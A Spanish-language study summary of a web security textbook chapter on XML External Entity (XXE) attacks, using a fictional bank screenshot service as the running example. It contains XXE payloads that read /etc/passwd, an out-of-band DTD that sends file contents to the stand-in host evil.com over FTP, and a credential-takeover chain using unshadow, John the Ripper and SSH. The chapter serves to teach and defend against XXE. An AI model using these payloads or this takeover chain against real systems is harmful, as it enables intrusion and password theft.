# Web Application Security (2nd Edition) — Andrew Hoffman (O'Reilly Media, 2024)
## Capítulo 12 — XML External Entity (Entidad externa XML)

> Nota de extracción: el texto se obtuvo de la capa de texto del PDF; las citas indican la página del PDF.

## Lo que necesitas saber

El capítulo presenta el ataque XML External Entity (XXE), una clase de ataque "a menudo muy simple de ejecutar, pero con resultados devastadores" (PDF p. 195). Depende de un parser XML mal configurado dentro del código de una aplicación. Casi todas las vulnerabilidades XXE aparecen en un endpoint de API que acepta un payload XML o similar a XML. Aunque pueda parecer poco común que un endpoint HTTP acepte XML, formatos como SVG, HTML/DOM, PDF (XFDF) y RTF comparten características con la especificación XML, y muchos parsers los aceptan como entrada.

La clave del ataque está en que la especificación XML incluye una anotación especial para importar archivos externos: la external entity. Esta directiva se interpreta en la máquina donde se evalúa el archivo XML, de modo que un payload XML diseñado y enviado al parser de un servidor puede comprometer archivos de su sistema de ficheros. XXE se usa a menudo para comprometer archivos de otros usuarios o para acceder a archivos como /etc/shadow que almacenan credenciales esenciales del servidor Unix.

Sales sabiendo qué son las entidades XML, la diferencia entre XXE directo e indirecto, cómo exfiltrar datos out-of-band, el flujo completo de account takeover (ATO) en Linux a partir de /etc/passwd y /etc/shadow, y por qué la defensa suele ser tan simple como una línea de configuración.

## El ejemplo que recorre el capítulo

El caso hilo conductor es una utilidad de captura de pantalla de mega-bank.com. Un botón "Send Screenshot to Support" dispara una función `screenshot()` que convierte el DOM del usuario a XML y lo envía a un servicio que lo transforma en JPG para el soporte. El flujo es:

1. El navegador convierte la vista actual (vía DOM) a XML.
2. El navegador envía ese XML a un servicio que lo convierte en JPG.
3. El navegador envía el JPG al soporte de MegaBank mediante otra API.

Para convertir el XML a JPG debe pasar por un parser XML que cumpla la especificación XML. Como el DOM que envía el cliente es modificable (o se puede forjar la petición de red directamente), un atacante puede enviar un payload XML propio con una entidad externa.

## XXE Fundamentals (Fundamentos)

Las XML entities son conjuntos de caracteres que referencian otro dato dentro del archivo XML o de la especificación. Tipos:

- Predefined entities: siempre referencian el mismo carácter ASCII, como `&amp;` (&) o `&lt;` (<).
- Custom entities: definidas por el programador, pueden referenciar datos fuera del documento XML actual.
- External entity reference: la forma más peligrosa y núcleo de XXE. Referenciando una entidad externa dentro del document type definition (DTD), se pueden incorporar archivos externos antes del parseo.

Ejemplo de entidad que referencia /etc/passwd (información sensible de cuentas de un sistema Linux):

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
```

Estas referencias externas se usan para filtrar información sensible, modificar la funcionalidad de la aplicación y, a veces, permitir remote code execution.

## Direct XXE (XXE directo)

En XXE directo se envía al servidor un objeto XML con un flag de entidad externa; se parsea y se devuelve un resultado que incluye la entidad externa. En el caso de MegaBank, el atacante forja la petición al endpoint `/screenshot` con `Content-Type: application/xml` y un XML manualmente creado:

```js
const rawXMLString = `<!ENTITY xxe SYSTEM
                                   "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;
```

Cuando el servidor procesa la petición, su parser evalúa el XML y devuelve la imagen (JPG). Si el parser no deshabilita explícitamente las entidades externas, el contenido de /etc/passwd aparecerá dentro de la captura devuelta. Un detalle extra del ejemplo: validar que una imagen sea legítima es más difícil que validar XML, y convertir imagen a XML pierde contexto (nombres de div, IDs, etc.).

## Indirect XXE (XXE indirecto)

En XXE indirecto, como resultado de una petición, el servidor genera un objeto XML que incluye parámetros del usuario, lo que puede terminar incluyendo una etiqueta de entidad externa. Que una API no acepte XML en su payload no significa que no use un parser XML.

Caso típico: una API REST recibe un solo parámetro del usuario y debe sincronizarlo con un software CRM de nivel empresarial que espera payloads XML. Aunque el payload público no sea XML, el servidor REST convierte el dato del usuario a XML para comunicarse con el CRM. Esto ocurre tras bambalinas y es muy común: APIs modernas JSON/REST acaban interactuando con APIs XML/SOAP heredadas, y esas integraciones suelen tener agujeros de seguridad profundos.

Para detectarlo sin información interna:
- Investigar qué acuerdos de licencia de software empresarial tiene la empresa (a veces son públicos).
- Revisar otras páginas que alojan para ver si algún dato se presenta vía un sistema o URL que no les pertenece.
- Conocer los tipos de datos y limitaciones de estructura de paquetes empresariales heredados (CRM, contabilidad, RRHH) para deducir su uso por el formato anómalo que espera la API pública.

## Out-of-Band Data Exfiltration (Exfiltración fuera de banda)

Una vulnerabilidad XXE no siempre devuelve datos aunque se ejecute correctamente. En ese caso lo ideal es exfiltrar durante el parseo, no con la respuesta: XML out-of-band data exfiltration. Se hace más fácilmente vía FTP, aunque también con el protocolo antiguo Gopher en servidores legacy.

El payload XXE referencia un DTD alojado en el servidor del atacante:

```xml
<?xml version="1.0?>
<!DOCTYPE a [
  <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
  %asd;
  %c; 
]>
<a>&rrr;</a>
```

Y el archivo data.dtd accesible por web contiene:

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```

Con FTP habilitado, al cargar el payload el servidor objetivo solicita el DTD externo, que transmite el contenido de /etc/passwd línea por línea vía FTP a los logs del atacante. En ciertos escenarios se puede usar la misma técnica sobre HTTP o LDAP.

## Account Takeover Workflow (Flujo de apropiación de cuenta)

Uno de los patrones más potentes es el Linux account takeover (ATO). Tras descubrir una vulnerabilidad XXE, se lanzan varios ataques XXE contra archivos core de autenticación/autorización de Linux hasta obtener un password hash y su algoritmo de hashing; luego se crackea y se inicia sesión como ese usuario con sus privilegios.

Obtaining System User Data: primer paso, obtener /etc/passwd (presente en Linux, BSD, Unix y WSL). Cada línea es una cuenta, con 7 campos separados por `:`:

```
dev:x:1010:2020:app_developer:/dev_user:/bin/bash
```

1. Nombre de usuario
2. Ubicación de almacenamiento de la contraseña (x denota /etc/shadow)
3. User ID
4. Primary group ID
5. Comentario / info varia
6. Directorio home del usuario
7. Ubicación del comando/shell

El dato clave es la línea 2: si es `x` (lo habitual), el hash estará en /etc/shadow. Además, /etc/passwd filtra home y grupos, útil para ataques futuros.

Obtaining Password Hashes: si las contraseñas aparecen como `x`, /etc/shadow contiene los hashes (usado por defecto en Ubuntu, Debian, Fedora, Mint, Arch). Cada línea, separada por `:`, incluye usuario, hash (formato `$id:$salt:$hash`), fecha de último cambio, mínimo/máximo de días entre cambios, días antes de expiración, días de deshabilitación tras expirar y fecha de expiración. El objetivo clave es la línea 2. El `$id` indica el algoritmo:

- `$1$` es MD5
- `$2a$` y `$2y$` son Blowfish
- `$5$` es SHA-256
- `$6$` es SHA-512
- `$y$` es yescrypt

Cracking Password Hashes: con John the Ripper o Hashcat. Estas herramientas no aceptan archivos /etc/shadow y /etc/passwd sin formato, por lo que se usa `unshadow`. Flujo:

```
unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt
john --show passwords.txt
```

Crackear es intensivo en tiempo y hardware: conviene la máquina con CPU/GPU más rápida. John the Ripper usa GPU o CPU, no ambas a la vez; Hashcat puede usar ambas.

SSH Remote Login: con usuario y contraseña, el paso final es autenticarse vía SSH. En macOS/Linux:

```
ssh <username>@<website.com>
```

Si SSH está habilitado, se solicita la contraseña; al coincidir, se controla remotamente al usuario comprometido. En Windows existen herramientas como PuTTy. Con esto el flujo ATO queda completado.

## Ideas clave

- XXE explota parsers XML mal configurados que aceptan external entities; afecta a XML y formatos tipo XML (SVG, HTML/DOM, XFDF, RTF).
- La external entity en el DTD permite incluir archivos externos antes del parseo, p. ej. `file:///etc/passwd`.
- XXE directo envía XML malicioso que se parsea y devuelve el contenido externo; XXE indirecto aprovecha que el servidor convierte datos a XML para sistemas legacy (CRM, SOAP).
- Si no hay retorno de datos, la exfiltración out-of-band vía FTP (o Gopher/HTTP/LDAP) saca el archivo línea por línea usando un DTD externo del atacante.
- El Linux ATO encadena XXE sobre /etc/passwd y /etc/shadow para obtener hash y algoritmo, los crackea (John the Ripper, Hashcat, unshadow) y entra por SSH.
- El campo 2 de /etc/passwd (`x`) indica que el hash está en /etc/shadow; el prefijo `$id` revela el algoritmo de hashing.
- Son ataques potentes pero fáciles de corregir: a veces basta una sola línea de configuración que deshabilite las entidades externas; deben probarse siempre en aplicaciones nuevas.
